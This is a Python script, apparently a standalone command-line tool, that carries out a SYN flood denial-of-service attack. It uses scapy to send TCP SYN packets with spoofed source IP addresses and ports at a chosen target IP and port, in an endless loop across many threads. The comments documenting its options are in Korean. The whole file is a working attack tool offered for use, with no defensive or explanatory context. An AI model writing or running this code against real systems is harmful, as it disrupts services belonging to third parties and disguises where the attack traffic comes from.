#python3.x synflood.py <Target ip> <Target port> <Number of threads> [option...]
#-------------------Option--------------------
#    -sip	   : Ip를 지정할 수 있습니다.
#    -sport    : Port를 지정할 수 있습니다.
#-----------------------------------------------

import sys
from threading import Thread
from scapy.all import *

class synflood(Thread):
    def __init__(self,Target_Ip,Target_Port,threads,spoof_ip,spoof_port):
        Thread.__init__(self)

        self.Target_Ip=Target_Ip
        self.Target_Port=Target_Port
        self.spoof_ip=spoof_ip
        self.spoof_port=spoof_port
        self.running=True

    def run(self):
        while self.running:
            self.synf=IP(src=self.spoof_ip,dst=self.Target_Ip)/TCP(flags='S',sport=int(self.spoof_port),dport=self.Target_Port)
            send(self.synf,verbose=0)

args = sys.argv[1:]

try:
    if args[0][0] != "-" and args[1].isdigit and int(args[2])>0 :
        Target_Ip=args[0]
        Target_Port=int(args[1])
        threads=int(args[2])

    else:
        print("usage : synflood <Target ip> <Target port> <Number of threads> [option...]\nNo value specified")
        exit()
except:
        print("usage : synflood <Target ip> <Target port> <Number of threads> [option...]\nNo value specified")
        exit()


option = ['-sip','-sport']

try:
    spoof_ip = RandIP()
    spoof_port = RandShort()

    if len(args) > 3 and len(args) < 8:
        for i in args[3::2]:
            if i in option:
                if args[args.index(i)+1][0] != "-":
                    if i == '-sip' :
                        spoof_ip = args[args.index(i)+1]

                    elif i == '-sport' :
                        spoof_port = args[args.index(i)+1]

                else:
                    print("usage : '{0}' of Value Incorect".format(i))
                    exit()
            else:
                print("usage : '{0}' Option Incorect".format(i))
                exit()

    elif len(args) == 3:
        pass

    else:
        print("Try manual for more information.")
        exit()

except IndexError as e :
    print("usage : '{0}' of Value Incorect".format(i))

for SYN_F in range(threads):
    SYN_F=synflood(Target_Ip,Target_Port,threads,spoof_ip,spoof_port)
    SYN_F.start()
